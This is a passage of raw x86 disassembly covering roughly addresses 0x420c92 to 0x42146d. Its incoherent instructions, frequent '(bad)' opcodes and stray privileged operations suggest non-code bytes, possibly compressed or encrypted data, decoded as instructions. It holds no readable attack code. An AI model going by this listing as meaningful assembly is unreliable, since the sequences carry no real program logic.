  420c92:	mov    BYTE PTR [eax-0x4b42660b],bl
  420c98:	cmc    
  420c99:	retf   
  420c9a:	js     0x420cdc
  420c9c:	and    dh,al
  420c9e:	jno    0x420c3c
  420ca0:	mov    ds:0x2664f199,eax
  420ca5:	mov    eax,0x67d283d9
  420caa:	jnp    0x420c8b
  420cac:	or     al,0xc0
  420cae:	sti    
  420caf:	mov    ah,0xaf
  420cb1:	fadd   DWORD PTR [ecx]
  420cb3:	xor    edx,DWORD PTR [edx]
  420cb5:	xor    eax,0xc82b7f14
  420cba:	int    0x8
  420cbc:	xor    dl,BYTE PTR [eax+eax*2+0x4c]
  420cc0:	pop    ds
  420cc1:	dec    esp
  420cc2:	or     eax,0xdaba7177
  420cc7:	jb     0x420c7b
  420cc9:	repz inc esp
  420ccb:	lds    ebp,FWORD PTR [ebx]
  420ccd:	push   cs
  420cce:	fwait
  420ccf:	test   al,0xd5
  420cd1:	addr16 fsub st,st(2)
  420cd4:	xchg   edx,eax
  420cd5:	and    eax,0xb5f82026
  420cda:	pop    esp
  420cdb:	fidivr DWORD PTR [edi]
  420cdd:	mov    al,ds:0xe42822d9
  420ce2:	pop    ecx
  420ce3:	ret    
  420ce4:	fimul  DWORD PTR [eax]
  420ce6:	aaa    
  420ce7:	dec    esp
  420ce8:	cmp    dh,cl
  420cea:	pop    edx
  420ceb:	push   esi
  420cec:	repz jmp 0x426c3c4a
  420cf2:	xlat   BYTE PTR ds:[ebx]
  420cf3:	leave  
  420cf4:	icebp  
  420cf5:	fwait
  420cf6:	pop    es
  420cf7:	cmp    eax,0x957d5159
  420cfc:	aaa    
  420cfd:	or     ah,BYTE PTR [edi]
  420cff:	mov    al,0x42
  420d01:	arpl   bp,si
  420d03:	out    dx,al
  420d04:	xor    dl,BYTE PTR [ebp-0x76]
  420d07:	push   ds
  420d08:	pop    eax
  420d09:	pop    esi
  420d0a:	push   cs
  420d0b:	or     al,0xf3
  420d0d:	test   DWORD PTR [eax+0x5c],eax
  420d10:	add    bh,BYTE PTR [eax*8-0x52da87d]
  420d17:	lods   al,BYTE PTR es:[esi]
  420d19:	stc    
  420d1a:	fisub  DWORD PTR [eax-0x78]
  420d1d:	out    dx,eax
  420d1e:	std    
  420d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d20:	test   BYTE PTR ds:0x9a10d56b,0xc9
  420d27:	test   DWORD PTR [edx+0x330a46ee],0xba8a5089
  420d31:	push   es
  420d32:	adc    eax,0xe2dc1767
  420d37:	dec    eax
  420d38:	sahf   
  420d39:	je     0x420d80
  420d3b:	cmp    dh,BYTE PTR [edx]
  420d3d:	pop    esp
  420d3e:	dec    ebp
  420d3f:	xchg   DWORD PTR [edx+0x4fdb6848],edi
  420d45:	ins    BYTE PTR es:[edi],dx
  420d46:	call   0x406f11bc
  420d4b:	mov    fs,WORD PTR [edi+eiz*8]
  420d4e:	push   es
  420d4f:	leave  
  420d50:	ins    BYTE PTR es:[edi],dx
  420d51:	lds    edi,FWORD PTR [esi-0x58]
  420d54:	mov    ebp,0x4ec5cd2b
  420d59:	in     al,dx
  420d5a:	outs   dx,DWORD PTR ds:[esi]
  420d5b:	scas   al,BYTE PTR es:[edi]
  420d5c:	cmp    bh,BYTE PTR [ecx+esi*1-0x38152ca4]
  420d63:	mov    es:0x5e10cf22,al
  420d69:	fwait
  420d6a:	nop    DWORD PTR [esi]
  420d6d:	xchg   ecx,eax
  420d6e:	push   edx
  420d6f:	mov    bl,0xf7
  420d72:	pop    eax
  420d73:	out    0x6f,eax
  420d75:	add    DWORD PTR [edi-0x5e],ecx
  420d78:	mov    esi,0x1e6033d9
  420d7d:	fs jno 0x420dff
  420d80:	sub    ch,BYTE PTR [ecx*8+0x1af4f6d0]
  420d87:	fwait
  420d88:	jp     0x420e07
  420d8a:	fsub   DWORD PTR [ebx]
  420d8c:	cmp    eax,0x5770f42b
  420d91:	cmp    ebp,DWORD PTR [ebp-0xc]
  420d94:	pop    eax
  420d95:	sub    eax,0x969df0ca
  420d9b:	and    ch,dl
  420d9d:	dec    ebp
  420d9e:	in     eax,0x7c
  420da0:	add    ebx,DWORD PTR [edx-0x6941fdf4]
  420da6:	lods   al,BYTE PTR ds:[esi]
  420da7:	xchg   edi,eax
  420da8:	jbe    0x420d65
  420daa:	sub    ch,dh
  420dac:	out    0x53,al
  420dae:	scas   al,BYTE PTR es:[edi]
  420daf:	cmp    ebx,DWORD PTR ds:0x612d8c2a
  420db5:	enter  0x6ae7,0x3a
  420db9:	(bad)  
  420dba:	sbb    ah,BYTE PTR [esi]
  420dbc:	test   al,0x37
  420dbe:	scas   eax,DWORD PTR es:[edi]
  420dbf:	mov    gs,WORD PTR [di+0x23]
  420dc3:	pop    esp
  420dc4:	sar    DWORD PTR [eax+0x685b8ec4],0x3e
  420dcb:	adc    al,0x68
  420dcd:	dec    ecx
  420dce:	adc    eax,0x67c4abd3
  420dd3:	data16 out dx,al
  420dd5:	sbb    al,0x32
  420dd7:	call   0x8a33:0x212dfd9f
  420dde:	sub    ah,ch
  420de0:	mov    bl,0x33
  420de2:	ja     0x420d99
  420de4:	sbb    eax,0xa59a78da
  420de9:	test   BYTE PTR [esi-0x26],bl
  420dec:	es jl  0x420e02
  420def:	push   ebx
  420df0:	xchg   esi,eax
  420df1:	push   ebp
  420df2:	das    
  420df3:	stos   WORD PTR es:[edi],ax
  420df5:	mov    ecx,0x7ab49ac5
  420dfa:	sub    ebx,DWORD PTR [eax-0x35]
  420dfd:	push   esp
  420dfe:	(bad)  [esi+edx*2-0x69]
  420e02:	mov    WORD PTR [esi+0x2d],ds
  420e05:	shl    ebx,1
  420e07:	pop    edi
  420e08:	repz mov al,0x6
  420e0b:	in     eax,0xb5
  420e0d:	pop    ecx
  420e0e:	scas   al,BYTE PTR es:[edi]
  420e0f:	fist   DWORD PTR ds:0x11751907
  420e15:	adc    cl,BYTE PTR [ebp-0x57]
  420e18:	ins    DWORD PTR es:[edi],dx
  420e19:	test   BYTE PTR [esi+0x4f],al
  420e1c:	ja     0x420dc7
  420e1e:	fldcw  WORD PTR [esp+edx*8+0x390d05e7]
  420e25:	jmp    0x420e23
  420e27:	out    dx,eax
  420e28:	scas   al,BYTE PTR es:[edi]
  420e29:	repnz pop ebx
  420e2b:	add    eax,0x99ef4350
  420e30:	loopne 0x420e11
  420e32:	adc    BYTE PTR [esi-0x47c8229d],dl
  420e38:	adc    DWORD PTR [ecx-0x4a6cae2d],0x910a2706
  420e42:	adc    edi,edx
  420e44:	call   0x55091538
  420e49:	cmp    al,0x55
  420e4b:	sbb    BYTE PTR [ebx-0x393d5a80],bl
  420e51:	jl     0x420e4a
  420e53:	jmp    0x420e5f
  420e55:	das    
  420e56:	fwait
  420e57:	push   ebx
  420e58:	mov    bl,0x95
  420e5a:	sub    DWORD PTR [eax+0x5f],ebx
  420e5d:	cmp    ch,BYTE PTR [ecx]
  420e5f:	jmp    0x420e1d
  420e61:	push   edi
  420e62:	daa    
  420e63:	in     eax,0xf2
  420e65:	mov    ds:0x596753fe,eax
  420e6a:	adc    edx,DWORD PTR [ebx]
  420e6c:	jbe    0x420eda
  420e6e:	jg     0x420ed6
  420e70:	(bad)  
  420e71:	cmc    
  420e72:	ins    DWORD PTR es:[edi],dx
  420e73:	sbb    edi,DWORD PTR [edi-0x73]
  420e76:	fstp   TBYTE PTR [eax-0x1]
  420e79:	mov    al,ds:0x19aa6523
  420e7e:	stc    
  420e7f:	scas   eax,DWORD PTR es:[edi]
  420e80:	sbb    DWORD PTR [esi-0x42],edx
  420e83:	sbb    BYTE PTR [ebx+eax*2-0x3c],cl
  420e87:	pop    esi
  420e88:	das    
  420e89:	sub    DWORD PTR [esi-0x28],0x3a
  420e8d:	mov    edx,DWORD PTR [edi-0x68fb4ef7]
  420e93:	arpl   WORD PTR [edi],bx
  420e95:	popa   
  420e96:	jae    0x420ef9
  420e98:	push   cs
  420e99:	xchg   esp,eax
  420e9a:	sbb    BYTE PTR [edx+0x21ee774e],bh
  420ea0:	cmp    BYTE PTR [eax-0x78],bh
  420ea3:	inc    edi
  420ea4:	push   0xa3d7261b
  420ea9:	xchg   ecx,eax
  420eaa:	mov    dl,0x44
  420eac:	or     al,0x32
  420eae:	cld    
  420eaf:	adc    eax,0xd0469abc
  420eb4:	fucomi st,st(3)
  420eb6:	xchg   ebx,eax
  420eb7:	and    edx,DWORD PTR [ebp+eax*8-0x18]
  420ebb:	stos   DWORD PTR es:[edi],eax
  420ebc:	add    BYTE PTR [edx+ecx*1+0x17],al
  420ec0:	cdq    
  420ec1:	adc    esi,DWORD PTR [edx+0x51]
  420ec4:	ins    BYTE PTR es:[edi],dx
  420ec5:	sbb    BYTE PTR [ebx+0x41],cl
  420ec8:	stc    
  420ec9:	mov    eax,ds:0x1dd606fb
  420ece:	sbb    bh,ah
  420ed0:	ror    ebp,cl
  420ed2:	inc    ebx
  420ed3:	mov    ch,0xac
  420ed5:	dec    edi
  420ed6:	stos   DWORD PTR es:[edi],eax
  420ed7:	xchg   ebx,eax
  420ed8:	and    al,0x3a
  420eda:	mov    DWORD PTR [eax],ecx
  420edc:	jo     0x420eb3
  420ede:	inc    edx
  420edf:	add    DWORD PTR [ecx+0x2],0xffffffb1
  420ee3:	loope  0x420eda
  420ee5:	fdiv   st,st(5)
  420ee7:	test   al,0x2e
  420ee9:	push   ebp
  420eea:	jbe    0x420e88
  420eec:	mov    WORD PTR [esi-0x77e36f8c],cs
  420ef2:	nop
  420ef3:	inc    ebp
  420ef4:	mov    al,BYTE PTR [ebx+0x70]
  420ef7:	lock and esi,DWORD PTR [esi]
  420efa:	lahf   
  420efb:	or     eax,0xf09d58b2
  420f00:	gs test al,0x16
  420f03:	ja     0x420f31
  420f05:	scas   al,BYTE PTR es:[edi]
  420f06:	mov    esp,0x5308cd3e
  420f0b:	(bad)  
  420f0c:	out    0xf6,eax
  420f0e:	lods   eax,DWORD PTR ds:[esi]
  420f0f:	(bad)  
  420f10:	mov    BYTE PTR [ebp+0x2b1bc7e4],bh
  420f16:	fcomp  QWORD PTR [edi-0x7ff568d3]
  420f1c:	push   edi
  420f1d:	xor    DWORD PTR [ecx],0xc7338535
  420f23:	push   eax
  420f24:	pop    ecx
  420f25:	hlt    
  420f26:	pop    esi
  420f27:	sbb    al,0xb1
  420f29:	scas   al,BYTE PTR es:[edi]
  420f2a:	rol    DWORD PTR [ecx],0x94
  420f2d:	xchg   edx,eax
  420f2e:	or     DWORD PTR [eax+0x422e08e2],ebp
  420f34:	test   DWORD PTR [esi],eax
  420f36:	sahf   
  420f37:	mov    ebx,DWORD PTR [ebp+0x2e498b5d]
  420f3d:	mov    ecx,0x4248d578
  420f42:	aad    0xef
  420f44:	out    0x29,eax
  420f46:	aam    0x77
  420f48:	mov    ds:0x61ca0f22,al
  420f4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f4e:	imul   ebp,DWORD PTR [ecx-0x72],0x3f1fdd39
  420f55:	mov    al,0x88
  420f57:	jbe    0x420f5c
  420f59:	sbb    ah,bh
  420f5b:	dec    ebp
  420f5c:	loope  0x420f02
  420f5e:	push   ebx
  420f5f:	jb     0x420f0f
  420f61:	and    DWORD PTR ds:0x812dbee3,eax
  420f67:	jb     0x420fa6
  420f69:	add    eax,0xda1d6b27
  420f6e:	ret    0x6851
  420f71:	jo     0x420f4d
  420f73:	pushf  
  420f74:	dec    eax
  420f75:	outs   dx,BYTE PTR ds:[esi]
  420f76:	addr16 (bad) 
  420f79:	and    ch,BYTE PTR [ebp-0x3edae4a4]
  420f7f:	add    al,0x1b
  420f81:	rol    DWORD PTR [ebx-0x27],cl
  420f84:	xchg   ebx,eax
  420f85:	or     ecx,DWORD PTR [ecx+0x20]
  420f88:	aam    0xe3
  420f8a:	das    
  420f8b:	out    0x55,al
  420f8d:	push   esp
  420f8e:	hlt    
  420f8f:	(bad)  
  420f90:	sti    
  420f91:	xchg   ebp,eax
  420f92:	ret    0x4d67
  420f95:	cmp    BYTE PTR ds:0xcbe4fe74,dh
  420f9b:	push   eax
  420f9c:	and    al,0x8b
  420f9e:	mov    edx,0x1e3990cd
  420fa3:	hlt    
  420fa4:	sti    
  420fa5:	fist   DWORD PTR [esp]
  420fa8:	jle    0x420feb
  420faa:	inc    ebp
  420fab:	mov    BYTE PTR [eax],bh
  420fad:	mov    ds:0xa1634d06,al
  420fb2:	mov    ch,0x3f
  420fb4:	sub    ebp,DWORD PTR [ecx-0x615a6d67]
  420fba:	xor    al,0x5d
  420fbc:	and    edx,esp
  420fbe:	dec    ebx
  420fbf:	aas    
  420fc0:	idiv   dh
  420fc2:	pushf  
  420fc3:	xchg   ebx,eax
  420fc4:	mov    ecx,0x4329a9d
  420fc9:	stc    
  420fca:	sub    esi,DWORD PTR ds:0x4293a78
  420fd0:	inc    esp
  420fd1:	fucomp st(0)
  420fd3:	cwde   
  420fd4:	pop    edx
  420fd5:	jno    0x42102c
  420fd7:	sbb    cl,bl
  420fd9:	iret   
  420fda:	sbb    dl,bh
  420fdc:	inc    ecx
  420fdd:	inc    ebx
  420fde:	aam    0xb4
  420fe0:	test   eax,0xa228785
  420fe5:	mov    ds:0x3dbe0c5e,al
  420fea:	inc    ebx
  420feb:	xor    eax,0x170ea70
  420ff0:	xor    ah,BYTE PTR [ebx-0x5b79014d]
  420ff6:	pop    ss
  420ff7:	or     ebp,DWORD PTR [edx+edx*8-0x2856bc28]
  420ffe:	push   es
  420fff:	aam    0xc9
  421001:	or     al,0xe1
  421003:	push   ds
  421004:	pop    ebp
  421005:	mov    eax,0x6e9751fa
  42100a:	cmp    bh,dh
  42100c:	ins    DWORD PTR es:[edi],dx
  42100d:	mov    WORD PTR [eax-0x51],?
  421010:	(bad)  
  421012:	xchg   BYTE PTR [esi+0xf],cl
  421015:	cdq    
  421016:	retf   
  421017:	stos   BYTE PTR es:[edi],al
  421018:	int3   
  421019:	or     ah,BYTE PTR [esi]
  42101b:	xchg   ebp,eax
  42101c:	cdq    
  42101d:	sbb    BYTE PTR [ecx],al
  42101f:	fnsave [edx+edx*1]
  421022:	sti    
  421023:	pop    edx
  421024:	mov    edi,DWORD PTR [esi-0x17436789]
  42102a:	std    
  42102b:	cmc    
  42102c:	daa    
  42102d:	jb     0x42105f
  42102f:	push   edx
  421030:	pop    eax
  421031:	mov    esp,0x16b0aba5
  421036:	cdq    
  421037:	xlat   BYTE PTR ds:[ebx]
  421038:	sub    ah,dh
  42103a:	xlat   BYTE PTR ds:[ebx]
  42103b:	add    DWORD PTR [edx+0x49ff34e3],ebp
  421041:	fbld   TBYTE PTR [edx+ebp*1-0xd]
  421045:	and    dh,BYTE PTR ds:0xa53ae0c
  42104b:	add    eax,0x5ecec398
  421050:	jle    0x420ff7
  421052:	push   ss
  421053:	mov    ds:0xebc7326e,al
  421058:	mov    edi,0x232bba37
  42105d:	jmp    0x421021
  42105f:	add    eax,0xa5c5c0b4
  421064:	inc    eax
  421065:	mov    al,ds:0xbafb4221
  42106a:	and    al,0xc
  42106c:	dec    edi
  42106d:	xchg   ebx,eax
  42106e:	mov    cl,0xf2
  421070:	call   0xb1e9568f
  421075:	cmp    BYTE PTR [edx-0x5af7de01],bl
  42107b:	add    esi,DWORD PTR [ecx-0x30585228]
  421081:	pop    esi
  421082:	fsub   QWORD PTR [edx-0x7ab4f47d]
  421088:	pop    ds
  421089:	xor    DWORD PTR ds:0x50007073,edi
  42108f:	stos   DWORD PTR es:[edi],eax
  421090:	cmc    
  421091:	mov    eax,0x3a6d73bf
  421096:	call   0x9976:0x984591f1
  42109d:	jp     0x42105c
  42109f:	aam    0x9b
  4210a1:	in     eax,dx
  4210a2:	pop    ecx
  4210a3:	mov    ebx,0x6b2240a
  4210a8:	arpl   WORD PTR ds:0x8f69c541,dx
  4210ae:	(bad)  
  4210af:	cmp    bh,BYTE PTR ds:0x3e479a27
  4210b5:	mov    eax,ds:0xa53f6c06
  4210ba:	cmp    eax,DWORD PTR [edx+0x1a]
  4210bd:	mov    bh,0x79
  4210bf:	arpl   WORD PTR [ebx+ebp*2-0x3d],di
  4210c3:	jne    0x4210fe
  4210c5:	cwde   
  4210c6:	add    DWORD PTR [eax+0x6],eax
  4210c9:	outs   dx,DWORD PTR ds:[esi]
  4210ca:	mov    esi,0xd5ccb282
  4210cf:	(bad)  
  4210d0:	(bad)  
  4210d1:	loop   0x421067
  4210d3:	cld    
  4210d4:	mov    ch,0xc7
  4210d6:	aam    0x6d
  4210d8:	sub    BYTE PTR [edx+0x2a2692da],ch
  4210de:	daa    
  4210df:	xor    DWORD PTR [esi],ebx
  4210e1:	xchg   BYTE PTR [ecx+0x11e1921c],al
  4210e7:	and    al,0x32
  4210e9:	out    0xbc,eax
  4210eb:	test   BYTE PTR [edi+0x2c],dl
  4210ee:	pop    eax
  4210ef:	(bad)  
  4210f0:	popf   
  4210f1:	inc    esi
  4210f2:	adc    cl,BYTE PTR [edi+eax*4-0x58]
  4210f6:	jmp    0x421160
  4210f8:	pop    ebp
  4210f9:	bound  esi,QWORD PTR [esi+ecx*1]
  4210fc:	fdiv   DWORD PTR [ebp+0x5cec4e4a]
  421102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421103:	fadd   QWORD PTR [edx-0x7f]
  421106:	sub    esi,ecx
  421108:	pusha  
  421109:	mov    bh,0x6b
  42110b:	dec    ebp
  42110c:	cmp    edx,DWORD PTR [ecx]
  42110e:	mov    cl,0x2
  421110:	les    ebx,FWORD PTR [edi+0x1e]
  421113:	mov    cl,BYTE PTR [edi-0x1b119531]
  421119:	push   ds
  42111a:	sahf   
  42111b:	jbe    0x4210c7
  42111d:	ss push cs
  42111f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421120:	shr    BYTE PTR [edx+ecx*8-0x3e2f3c90],1
  421127:	in     eax,0xef
  421129:	jb     0x42112e
  42112b:	dec    edi
  42112c:	or     BYTE PTR [esi+0x7a2c5641],0x2e
  421133:	push   esp
  421134:	call   0x84b8:0x9d810fd7
  42113b:	adc    eax,0x7804456e
  421140:	jl     0x421168
  421142:	xor    al,0x30
  421144:	mov    edi,0x8bb7d90e
  421149:	pop    ecx
  42114a:	loope  0x4210e4
  42114c:	or     DWORD PTR [ebp+0x28],0x65a010d9
  421153:	xor    al,0xab
  421155:	(bad)  
  421156:	sub    eax,0xd2295161
  42115b:	cmc    
  42115c:	ins    DWORD PTR es:[edi],dx
  42115d:	ins    DWORD PTR es:[edi],dx
  42115e:	jg     0x421149
  421160:	cs jne 0x421166
  421163:	jl     0x4210e5
  421165:	mov    bh,0xe5
  421167:	mov    ds:0xf668ed14,al
  42116c:	pop    esi
  42116d:	test   DWORD PTR [eax+0x3],esp
  421170:	cmp    ebp,ebx
  421172:	adc    DWORD PTR [ecx-0x3f],ebp
  421175:	push   ds
  421176:	cld    
  421177:	pusha  
  421178:	mov    ds:0x7dd50ce4,al
  42117d:	xor    ah,BYTE PTR [edi+0x14]
  421180:	or     eax,0x6b8f8bf4
  421185:	sahf   
  421186:	mov    ebx,0x38b8b495
  42118b:	fst    st(1)
  42118d:	stc    
  42118e:	aam    0x0
  421190:	mov    esp,0x21a66e7a
  421195:	sti    
  421196:	xor    BYTE PTR [ecx],dl
  421198:	int3   
  421199:	fnstsw WORD PTR [ecx]
  42119b:	dec    edi
  42119c:	pop    ecx
  42119d:	(bad)  
  42119e:	ja     0x421126
  4211a0:	dec    eax
  4211a1:	mov    edi,ds
  4211a3:	adc    cl,BYTE PTR [ebx+esi*1+0x70a71d7c]
  4211aa:	int    0xff
  4211ac:	or     eax,0xe39f8786
  4211b1:	add    al,0xa5
  4211b4:	stc    
  4211b5:	dec    esi
  4211b6:	cmp    cl,dl
  4211b8:	test   BYTE PTR [ebp-0x3a],cl
  4211bb:	jmp    0xafda0fb6
  4211c0:	mov    fs,WORD PTR [edx+0x3d3d6d2]
  4211c6:	(bad)  
  4211c7:	pop    ds
  4211c8:	retf   0x675f
  4211cb:	xor    DWORD PTR ds:0xec10ad4d,0x44df136
  4211d5:	or     BYTE PTR [edi-0x58],bh
  4211d8:	add    BYTE PTR [edx],ch
  4211da:	adc    eax,0xd9dddc97
  4211df:	mov    ch,0x48
  4211e1:	icebp  
  4211e2:	into   
  4211e3:	loope  0x4211d7
  4211e5:	push   ebx
  4211e6:	cmp    bl,al
  4211e8:	jbe    0x421261
  4211ea:	push   0xfffffff6
  4211ec:	fld    TBYTE PTR [edx]
  4211ee:	adc    eax,ecx
  4211f0:	inc    esp
  4211f1:	fisttp DWORD PTR [edx+0x5c828f0c]
  4211f7:	dec    esi
  4211f8:	add    BYTE PTR [esi-0x6640de6d],bl
  4211fe:	out    dx,eax
  4211ff:	shr    ah,0x82
  421202:	mov    esp,0x7af57aa8
  421207:	and    DWORD PTR [esi-0x6a5be65d],esp
  42120d:	cmp    DWORD PTR [edi-0x33],edx
  421210:	(bad)  
  421211:	adc    eax,0x1c218d4
  421216:	pop    es
  421217:	xchg   esp,eax
  421218:	pop    esp
  42121a:	test   BYTE PTR [esi-0x7efbe80d],ch
  421220:	arpl   WORD PTR [edi],bx
  421222:	or     BYTE PTR [edi],ch
  421224:	loopne 0x42122c
  421226:	test   eax,0x3873b852
  42122b:	es in  eax,dx
  42122d:	sbb    ebx,eax
  42122f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421230:	mov    eax,0xc7c3fea3
  421235:	adc    al,0x50
  421237:	fstp   TBYTE PTR [ebp-0xc]
  42123a:	(bad)  
  42123b:	jle    0x42124b
  42123d:	(bad)
  421240:	xchg   ecx,eax
  421241:	xlat   BYTE PTR ds:[ebx]
  421242:	jmp    0xc2ed:0x6a3ee424
  421249:	jbe    0x4211d7
  42124b:	nop
  42124c:	mov    al,ds:0x69f5bae3
  421251:	push   es
  421252:	stos   DWORD PTR es:[edi],eax
  421253:	int3   
  421254:	gs cmp eax,0xc6c57349
  42125a:	icebp  
  42125b:	add    BYTE PTR [eax+0x18],bh
  42125e:	inc    ebp
  42125f:	xchg   ecx,eax
  421260:	xor    eax,DWORD PTR [ebx-0x607efd57]
  421266:	xchg   BYTE PTR [esi],al
  421268:	stos   BYTE PTR es:[edi],al
  421269:	stc    
  42126a:	adc    eax,0xade3117
  42126f:	fisub  WORD PTR [edi]
  421271:	clc    
  421272:	cwde   
  421273:	mov    eax,0x76766af9
  421278:	popa   
  421279:	aas    
  42127a:	push   0xffffff8c
  42127c:	mov    ds:0x61787f23,eax
  421281:	push   ebp
  421282:	hlt    
  421283:	(bad)  
  421284:	mov    dl,0xdf
  421286:	and    dh,bl
  421288:	and    DWORD PTR [ebp+0x63],ebp
  42128b:	add    DWORD PTR ds:0xd789e461,ebp
  421291:	cmc    
  421292:	xchg   ecx,eax
  421293:	push   ebx
  421294:	mov    ds,WORD PTR [esi]
  421296:	test   DWORD PTR [edi+0x37b7f1bf],edi
  42129c:	data16 into 
  42129e:	(bad)  
  42129f:	mov    edi,0xde7c8867
  4212a4:	shr    BYTE PTR [ecx],cl
  4212a6:	xchg   ebp,eax
  4212a7:	add    cl,BYTE PTR [ebx]
  4212a9:	leave  
  4212aa:	mov    ds:0xd2dfbaf2,al
  4212af:	sub    edi,ecx
  4212b1:	jo     0x4212b6
  4212b3:	push   esp
  4212b4:	push   0x51
  4212b6:	xchg   esi,eax
  4212b7:	mov    dl,0xd
  4212b9:	hlt    
  4212ba:	cmp    BYTE PTR [eax+eiz*8],0x75
  4212be:	adc    dh,BYTE PTR [esi-0x3a8cdb9d]
  4212c4:	jge    0x42128e
  4212c6:	cmp    BYTE PTR [esi+0x621076d2],cl
  4212cc:	test   esp,esi
  4212ce:	(bad)  
  4212cf:	jge    0x421251
  4212d1:	outs   dx,DWORD PTR ds:[esi]
  4212d2:	lea    ecx,[edx-0x1ed17daf]
  4212d8:	jl     0x421347
  4212da:	mov    ah,0x68
  4212dc:	sahf   
  4212dd:	hlt    
  4212de:	fadd   QWORD PTR [ebx]
  4212e0:	mov    BYTE PTR [esi+0x4f],dl
  4212e3:	or     ebp,edi
  4212e5:	in     eax,dx
  4212e6:	test   DWORD PTR [ecx-0x71],ecx
  4212e9:	js     0x4212d4
  4212eb:	popa   
  4212ec:	lds    ebp,FWORD PTR [edi+0x96f9fe6]
  4212f2:	sub    bl,ah
  4212f4:	and    ch,bh
  4212f6:	pop    esi
  4212f7:	cli    
  4212f8:	outs   dx,DWORD PTR ds:[esi]
  4212f9:	popf   
  4212fa:	push   edi
  4212fb:	repnz (bad) [edx-0x1a301d82]
  421302:	jne    0x42134a
  421304:	mov    ds:0x56b883d4,eax
  421309:	repnz pop edx
  42130b:	mov    dh,0xf3
  42130d:	sbb    eax,0xacc9a3d2
  421312:	add    DWORD PTR [ecx],ecx
  421314:	cmc    
  421315:	jne    0x4212b7
  421317:	sub    eax,0xf1acdb47
  42131c:	xchg   DWORD PTR [ebp-0x1f],edx
  42131f:	movups xmm5,xmm1
  421322:	jbe    0x4212f0
  421324:	dec    edi
  421325:	jge    0x4212a7
  421327:	pop    ds
  421328:	scas   al,BYTE PTR es:[edi]
  421329:	mov    ds:0x85152e16,al
  42132e:	mov    edi,0xf2ff74ad
  421333:	push   esi
  421334:	ja     0x4212f4
  421336:	fwait
  421337:	mov    ds:0x63695221,al
  42133c:	adc    al,0xa6
  42133e:	data16 je 0x42138d
  421341:	jg     0x421324
  421343:	pop    ds
  421344:	stc    
  421345:	pop    ss
  421346:	daa    
  421347:	push   0xe35dac9
  42134c:	in     al,dx
  42134d:	mov    ebp,0x2457969f
  421352:	rol    DWORD PTR [esi],cl
  421354:	push   ds
  421355:	jecxz  0x4212e0
  421357:	push   eax
  421358:	shl    DWORD PTR [edx+0xc7c8648],cl
  42135e:	sub    DWORD PTR [ebx+0x64],0xe5701b45
  421365:	das    
  421366:	cmp    ebp,esp
  421368:	push   ebp
  421369:	mov    ebx,0xc796a9ca
  42136e:	mov    dl,0x37
  421370:	sub    al,BYTE PTR [edi+ebp*1]
  421373:	pop    edi
  421374:	les    ecx,FWORD PTR [ebp-0x5fa94feb]
  42137a:	jno    0x4213a7
  42137c:	push   ebx
  42137d:	jmp    DWORD PTR ds:0xbd1e488c
  421383:	mov    ebp,0x82c09e81
  421388:	push   ds
  421389:	sbb    eax,DWORD PTR [ebp-0x22b02d47]
  42138f:	fwait
  421390:	leave  
  421391:	rep ins BYTE PTR es:[edi],dx
  421393:	jmp    0xf771782c
  421398:	xor    dl,BYTE PTR [ecx-0x6e8fce2b]
  42139e:	mov    al,ds:0x919761d9
  4213a3:	mov    eax,0x8131c6cc
  4213a8:	cmp    dh,BYTE PTR [edx+0x12359f22]
  4213ae:	sub    ch,al
  4213b0:	ret    0x7334
  4213b3:	sub    eax,0x1a8efbbd
  4213b8:	cmp    BYTE PTR [edx],0xa
  4213bb:	mov    ch,0x9c
  4213bd:	push   es
  4213be:	mov    ss,WORD PTR [edx+0x13]
  4213c1:	jge    0x421358
  4213c3:	test   bh,dh
  4213c5:	in     eax,dx
  4213c6:	push   eax
  4213c7:	pushf  
  4213c8:	fcmovu st,st(7)
  4213ca:	idiv   esp
  4213cc:	fsubr  DWORD PTR [ecx+edi*4]
  4213cf:	call   0x302a:0xc1abd37f
  4213d6:	sub    edi,DWORD PTR [esp+eiz*4+0x2a]
  4213da:	cmp    al,0x9d
  4213dc:	mov    ds:0x2ef04c61,al
  4213e1:	xor    al,0xfb
  4213e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213e4:	pop    edi
  4213e5:	enter  0xc588,0xa9
  4213e9:	dec    eax
  4213ea:	data16 jmp 0x42138f
  4213ed:	push   ebp
  4213ee:	jbe    0x421452
  4213f0:	pop    esi
  4213f1:	adc    eax,0x2ce98770
  4213f6:	std    
  4213f7:	ret    
  4213f8:	iret   
  4213f9:	push   ds
  4213fa:	jo     0x4213d0
  4213fc:	lock (bad) 
  4213fe:	push   edx
  4213ff:	push   ebp
  421400:	lahf   
  421401:	out    dx,eax
  421402:	imul   esi,DWORD PTR [ebp-0x1a],0xdc74a5c3
  421409:	push   esp
  42140a:	sub    ebx,eax
  42140c:	inc    esp
  42140d:	in     eax,dx
  42140e:	gs iret 
  421410:	sub    BYTE PTR [ecx],bl
  421412:	jne    0x42139c
  421414:	mov    DWORD PTR ss:[ebp-0x6f],esp
  421418:	xor    eax,0x3b86da1c
  42141d:	and    BYTE PTR [ecx+0x1a],dl
  421420:	mov    ?,WORD PTR [edi+0x56f19c8]
  421426:	enter  0x7f6f,0x55
  42142a:	retf   
  42142b:	fwait
  42142c:	adc    esi,DWORD PTR [ebx+eiz*8+0x71c5e750]
  421433:	test   BYTE PTR [edi-0x4e],cl
  421436:	pushf  
  421437:	adc    ebx,DWORD PTR [ebx-0x6b]
  42143a:	mov    ebx,0x5dce8f62
  42143f:	mov    BYTE PTR [edi+0x6b],dh
  421442:	sub    esp,DWORD PTR [edi+0x6a81a0dc]
  421448:	rcl    BYTE PTR [eax],1
  42144a:	pop    ds
  42144b:	outs   dx,DWORD PTR ds:[esi]
  42144c:	pop    edx
  42144d:	leave  
  42144e:	push   ss
  42144f:	(bad)  
  421450:	and    al,0xb6
  421452:	jae    0x421438
  421454:	imul   ebx,DWORD PTR [edx+0x31],0x6
  421458:	sbb    BYTE PTR [eax-0x5],0x7c
  42145c:	adc    al,0xe0
  42145e:	pop    edi
  42145f:	stos   BYTE PTR es:[edi],al
  421460:	xor    edx,DWORD PTR [edx-0x29]
  421463:	xchg   ecx,eax
  421464:	jnp    0x421483
  421466:	sub    ah,BYTE PTR [edx+0x67]
  421469:	or     al,0xa2
  42146b:	gs xchg edi,eax
  42146d:	add    ch,BYTE PTR [edi+edi*4+0x72]
